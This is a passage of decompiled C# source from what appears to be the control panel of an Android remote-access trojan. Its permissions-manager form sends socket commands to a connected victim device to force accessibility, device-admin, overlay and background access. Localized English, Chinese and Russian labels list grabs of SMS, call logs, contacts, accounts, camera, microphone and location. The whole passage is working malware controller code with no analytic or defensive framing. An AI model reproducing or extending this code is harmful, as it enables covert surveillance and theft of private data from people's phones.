					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"RPM<*>LOC",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				EagleAlert.ShowSucess("Request Sent...");
			}
		}

		// Token: 0x06000784 RID: 1924 RVA: 0x00002423 File Offset: 0x00000623
		private void PermissionsManager_Load_1(object sender, EventArgs e)
		{
		}

		// Token: 0x06000785 RID: 1925 RVA: 0x000C7D48 File Offset: 0x000C5F48
		private void drakeUIOSSwitch2_ValueChanged(object sender, bool value)
		{
			if (this.drakeUIOSSwitch2.Enabled && this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"RPM<*>GA",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				EagleAlert.ShowSucess("Request Sent...");
			}
		}

		// Token: 0x06000786 RID: 1926 RVA: 0x000C6AD0 File Offset: 0x000C4CD0
		private void checkacess_ValueChanged(object sender, bool value)
		{
			if (this.checkacess.Enabled && this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"RPM<*>ACC",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				EagleAlert.ShowSucess("Request Sent...");
			}
		}

		// Token: 0x06000787 RID: 1927 RVA: 0x000C7E78 File Offset: 0x000C6078
		private void drakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			if (this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"RPM<*>[lod]",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				EagleAlert.ShowSucess("Permissions Updated...");
			}
		}

		// Token: 0x06000788 RID: 1928 RVA: 0x000C7F98 File Offset: 0x000C6198
		private void drakeUIButton1_Click(object sender, EventArgs e)
		{
			if (this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2 + Data.SPL_SOCKET + "adm<*>",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				EagleAlert.ShowSucess("Permissions Updated...");
			}
		}

		// Token: 0x06000789 RID: 1929 RVA: 0x000C80B4 File Offset: 0x000C62B4
		private void UpdateEnglish()
		{
			this.label22.Text = "Request Permission";
			this.label7.Text = "Accessibility Service";
			this.label8.Text = "Draw over apps";
			this.label9.Text = "Battery optimizing";
			this.label10.Text = "Auto Start(Xiaomi)";
			this.label11.Text = "Run in Background";
			this.label14.Text = "Set wallpaper";
			this.label15.Text = "Send SMS";
			this.label21.Text = "Accounts";
			this.label12.Text = "Make Calls";
			this.label13.Text = "Read SMS";
			this.label17.Text = "Read calls logs";
			this.label16.Text = "Contact list";
			this.label19.Text = "Camera Access";
			this.label18.Text = "Microphone";
			this.label20.Text = "Location";
			this.drakeUIButtonIcon1.Text = "Refresh";
		}

		// Token: 0x0600078A RID: 1930 RVA: 0x000C81D4 File Offset: 0x000C63D4
		private void UpdateChinese()
		{
			this.label22.Text = "请求权限";
			this.label7.Text = "辅助功能服务";
			this.label8.Text = "在应用上绘制";
			this.label9.Text = "电池优化";
			this.label10.Text = "自动启动 (小米)";
			this.label11.Text = "后台运行";
			this.label14.Text = "设置壁纸";
			this.label15.Text = "发送短信";
			this.label21.Text = "账户";
			this.label12.Text = "拨打电话";
			this.label13.Text = "读取短信";
			this.label17.Text = "读取通话记录";
			this.label16.Text = "联系人列表";
			this.label19.Text = "相机访问";
			this.label18.Text = "麦克风";
			this.label20.Text = "位置";
			this.drakeUIButtonIcon1.Text = "刷新";
		}

		// Token: 0x0600078B RID: 1931 RVA: 0x000C82F4 File Offset: 0x000C64F4
		private void UpdateRussian()
		{
			this.label22.Text = "Запрос разрешения";
			this.label7.Text = "Служба доступности";
			this.label8.Text = "Рисовать поверх приложений";
			this.label9.Text = "Оптимизация батареи";
			this.label10.Text = "Автозапуск (Xiaomi)";
			this.label11.Text = "Запуск в фоновом режиме";
			this.label14.Text = "Установить обои";
			this.label15.Text = "Отправить SMS";
			this.label21.Text = "Аккаунты";
			this.label12.Text = "Совершать звонки";
			this.label13.Text = "Читать SMS";
			this.label17.Text = "Читать журналы вызовов";
			this.label16.Text = "Список контактов";
			this.label19.Text = "Доступ к камере";
			this.label18.Text = "Микрофон";
			this.label20.Text = "Местоположение";
			this.drakeUIButtonIcon1.Text = "Обновить";
		}

		// Token: 0x0600078C RID: 1932 RVA: 0x000C8414 File Offset: 0x000C6614
		private void UpdateLanguage()
		{
			string text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "Config", "Language.inf");
			if (File.Exists(text))
			{
				string text2 = File.ReadAllText(text);
				if (text2.Contains("English"))
				{
					this.UpdateEnglish();
					return;
				}
				if (text2.Contains("Russian"))
				{
					this.UpdateRussian();
					return;
				}
				if (text2.Contains("Chinese"))
				{
					this.UpdateChinese();
					return;
				}
				this.UpdateEnglish();
			}
		}

		// Token: 0x040008CA RID: 2250
		public Client Classclient;

		// Token: 0x040008CB RID: 2251
		public bool Acces_prog;

		// Token: 0x040008CC RID: 2252
		public bool draw_prog;

		// Token: 0x040008CD RID: 2253
		public bool install_prog;

		// Token: 0x040008CE RID: 2254
		public bool battary_prog;

		// Token: 0x0200008A RID: 138
		// (Invoke) Token: 0x0600078E RID: 1934
		public delegate void recordnames(object[] obj);

		// Token: 0x0200008B RID: 139
		// (Invoke) Token: 0x06000792 RID: 1938
		public delegate void updatedele(object[] obj);
	}
}
